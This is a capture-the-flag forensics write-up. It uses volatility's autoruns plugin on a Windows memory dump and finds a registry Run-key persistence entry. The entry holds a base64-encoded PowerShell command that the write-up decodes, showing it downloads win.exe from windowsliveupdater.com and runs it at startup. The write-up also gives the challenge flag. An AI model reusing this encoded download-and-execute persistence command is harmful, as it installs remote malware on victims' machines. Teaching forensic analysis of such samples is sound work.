# Persist (300)

## Problem

> Although Santa just updated his infra, problems still occur. He keeps complaining about slow boot time and a blue window popping up for a split second during startup. The IT elves support suggested that he should restart his computer. Ah, classic IT support!

* [forensics_persist.zip](http://46.101.25.140/forensics_persist.zip)

## Solution

1. The challenge description mentions that a blue window appears on startup. This window is likely PowerShell and it is likely launched by a program that runs on startup. This challenge consists of a memory dump that can be analyzed using [volatility](https://www.volatilityfoundation.org/).

2. Searching Google for "volatility start up programs" finds [tomchop/volatility-autoruns](https://github.com/tomchop/volatility-autoruns) ([corresponding blog post](http://tomchop.me/2014/09/18/volatility-autoruns/)). [HackTricks](https://book.hacktricks.xyz/forensics/basic-forensic-methodology/memory-dump-analysis/volatility-examples#autoruns) also mentions this plugin.

3. We can run this plugin with [volatility](https://www.volatilityfoundation.org/) like so: `./volatility_2.5_linux_x64 --plugins=volatility-autoruns/ -f persist.raw --profile=Win7SP1x86 autoruns`. Make sure that the `--plugins` is the first argument, otherwise this command will not work.

4. The output of the `autoruns` plugin is as follows:

    ```
    Volatility Foundation Volatility Framework 2.5


    Autoruns==========================================

    Hive: \SystemRoot\System32\Config\SOFTWARE 
        Microsoft\Windows\CurrentVersion\Run (Last modified: 2021-11-26 14:18:38 UTC+0000)
            C:\BGinfo\Bginfo.exe /accepteula /ic:\bginfo\bgconfig.bgi /timer:0 : bginfo (PIDs: )

    Hive: \SystemRoot\System32\Config\SOFTWARE 
        Microsoft\Windows\CurrentVersion\Run (Last modified: 2021-11-26 14:18:38 UTC+0000)
            %SystemRoot%\system32\VBoxTray.exe : VBoxTray (PIDs: 1456, 2796)

    Hive: \??\C:\Users\Santa\ntuser.dat 
        Software\Microsoft\Windows\CurrentVersion\Run (Last modified: 2021-11-30 22:04:29 UTC+0000)
            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -enc JABQAGEAdABoACAAPQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdwBpAG4AZABvAHcAcwBcAHcAaQBuAC4AZQB4AGUAJwA7AGkAZgAgACgALQBOAE8AVAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAJABQAGEAdABoACAALQBQAGEAdABoAFQAeQBwAGUAIABMAGUAYQBmACkAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAFAAYQB0AGgAfQBlAGwAcwBlAHsAbQBrAGQAaQByACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXAB3AGkAbgBkAG8AdwBzACcAOwAkAGYAbABhAGcAIAA9ACAAIgBIAFQAQgB7AFQAaAAzAHMAMwBfADMAbAB2ADMAcwBfADQAcgAzAF8AcgAzADQAbABsAHkAXwBtADQAbAAxAGMAMQAwAHUAcwB9ACIAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtAC8AdwBpAG4ALgBlAHgAZQAiACwAJABQAGEAdABoACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAGEAdABoAH0AJQA= : cmFuZG9tCg (PIDs: )

    Hive: \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT 
        Software\Microsoft\Windows\CurrentVersion\Run (Last modified: 2009-07-14 04:34:14 UTC+0000)
            %ProgramFiles%\Windows Sidebar\Sidebar.exe /autoRun : Sidebar (PIDs: )

    Hive: \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT 
        Software\Microsoft\Windows\CurrentVersion\Run (Last modified: 2009-07-14 04:34:14 UTC+0000)
            %ProgramFiles%\Windows Sidebar\Sidebar.exe /autoRun : Sidebar (PIDs: )

    Hive: \??\C:\Users\sshd_server\ntuser.dat 
        Software\Microsoft\Windows\CurrentVersion\Run (Last modified: 2015-09-21 09:50:52 UTC+0000)
            %ProgramFiles%\Windows Sidebar\Sidebar.exe /autoRun : Sidebar (PIDs: )

    Hive: \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT 
        Software\Microsoft\Windows\CurrentVersion\RunOnce (Last modified: 2015-09-21 19:14:18 UTC+0000)
            C:\Windows\System32\mctadmin.exe : mctadmin (PIDs: )

    Hive: \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT 
        Software\Microsoft\Windows\CurrentVersion\RunOnce (Last modified: 2015-09-21 19:14:18 UTC+0000)
            C:\Windows\System32\mctadmin.exe : mctadmin (PIDs: )

    Hive: \??\C:\Users\sshd_server\ntuser.dat 
        Software\Microsoft\Windows\CurrentVersion\RunOnce (Last modified: 2015-09-21 09:50:52 UTC+0000)
            C:\Windows\System32\mctadmin.exe : mctadmin (PIDs: )



    Winlogon (Shell)==================================

    Shell: explorer.exe
        Default value: Explorer.exe
        PIDs: 1272, 2676
        Last write time: 2021-11-30 22:05:06 UTC+0000



    Winlogon (Userinit)===============================

    Userinit: C:\Windows\system32\userinit.exe,
        Default value: userinit.exe
        PIDs: 
        Last write time: 2021-11-30 22:05:06 UTC+0000



    Services==========================================

    Service: clr_optimization_v4.0.30319_32 - Microsoft .NET Framework NGEN v4.0.30319_X86 (Win32_Own_Process - Auto Start)
        Image path: C:\Windows\Microsoft.NET\Framework\v4.0.30319\mscorsvw.exe (Last modified: 2015-09-21 10:00:26 UTC+0000)
        PIDs: 

    Service: OpenSSHd - OpenSSH Server (Win32_Own_Process - Auto Start)
        Image path: C:\Program Files\OpenSSH\bin\cygrunsrv.exe (Last modified: 2015-09-21 09:50:52 UTC+0000)
        PIDs: 1868



    Active Setup======================================

    Command line: %SystemRoot%\system32\unregmp2.exe /ShowWMP
    Last-written: 2015-09-21 14:39:11 UTC+0000 (PIDs: )

    Command line: C:\Windows\System32\ie4uinit.exe -UserIconConfig
    Last-written: 2015-09-21 10:27:54 UTC+0000 (PIDs: )

    Command line: "C:\Windows\System32\rundll32.exe" "C:\Windows\System32\iedkcs32.dll",BrandIEActiveSetup SIGNUP
    Last-written: 2015-09-21 10:27:54 UTC+0000 (PIDs: )

    Command line: %SystemRoot%\system32\regsvr32.exe /s /n /i:/UserInstall %SystemRoot%\system32\themeui.dll
    Last-written: 2009-07-14 04:37:08 UTC+0000 (PIDs: )

    Command line: "%ProgramFiles%\Windows Mail\WinMail.exe" OCInstallUserConfigOE
    Last-written: 2015-09-21 10:27:54 UTC+0000 (PIDs: )

    Command line: %SystemRoot%\system32\unregmp2.exe /FirstLogon /Shortcuts /RegBrowsers /ResetMUI
    Last-written: 2015-09-21 14:39:11 UTC+0000 (PIDs: )

    Command line: regsvr32.exe /s /n /i:U shell32.dll
    Last-written: 2015-09-21 14:39:11 UTC+0000 (PIDs: )

    Command line: C:\Windows\System32\ie4uinit.exe -BaseSettings
    Last-written: 2015-09-21 10:27:54 UTC+0000 (PIDs: )

    Command line: C:\Windows\system32\Rundll32.exe C:\Windows\system32\mscories.dll,Install
    Last-written: 2015-09-21 19:14:16 UTC+0000 (PIDs: )
    ```

5. We see that the `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -enc JABQAGEAdABoACAAPQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdwBpAG4AZABvAHcAcwBcAHcAaQBuAC4AZQB4AGUAJwA7AGkAZgAgACgALQBOAE8AVAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAJABQAGEAdABoACAALQBQAGEAdABoAFQAeQBwAGUAIABMAGUAYQBmACkAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAFAAYQB0AGgAfQBlAGwAcwBlAHsAbQBrAGQAaQByACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXAB3AGkAbgBkAG8AdwBzACcAOwAkAGYAbABhAGcAIAA9ACAAIgBIAFQAQgB7AFQAaAAzAHMAMwBfADMAbAB2ADMAcwBfADQAcgAzAF8AcgAzADQAbABsAHkAXwBtADQAbAAxAGMAMQAwAHUAcwB9ACIAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtAC8AdwBpAG4ALgBlAHgAZQAiACwAJABQAGEAdABoACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAGEAdABoAH0AJQA=` command is run on boot. It looks like this command contains a base64 encoded string. Let's run `echo "JABQAGEAdABoACAAPQAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdwBpAG4AZABvAHcAcwBcAHcAaQBuAC4AZQB4AGUAJwA7AGkAZgAgACgALQBOAE8AVAAoAFQAZQBzAHQALQBQAGEAdABoACAALQBQAGEAdABoACAAJABQAGEAdABoACAALQBQAGEAdABoAFQAeQBwAGUAIABMAGUAYQBmACkAKQB7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAFAAYQB0AGgAfQBlAGwAcwBlAHsAbQBrAGQAaQByACAAJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXAB3AGkAbgBkAG8AdwBzACcAOwAkAGYAbABhAGcAIAA9ACAAIgBIAFQAQgB7AFQAaAAzAHMAMwBfADMAbAB2ADMAcwBfADQAcgAzAF8AcgAzADQAbABsAHkAXwBtADQAbAAxAGMAMQAwAHUAcwB9ACIAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtAC8AdwBpAG4ALgBlAHgAZQAiACwAJABQAGEAdABoACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABQAGEAdABoAH0AJQA=" | base64 -d` to see what it contains:

    ```
    $Path = 'C:\ProgramData\windows\win.exe';if (-NOT(Test-Path -Path $Path -PathType Leaf)){Start-Process $Path}else{mkdir 'C:\ProgramData\windows';$flag = "HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}";iex (New-Object System.Net.WebClient).DownloadFile("https://windowsliveupdater.com/win.exe",$Path);Start-Process $Path}%%
    ```

6. The flag is in the decoded output.

### Flag

`HTB{Th3s3_3lv3s_4r3_r34lly_m4l1c10us}`
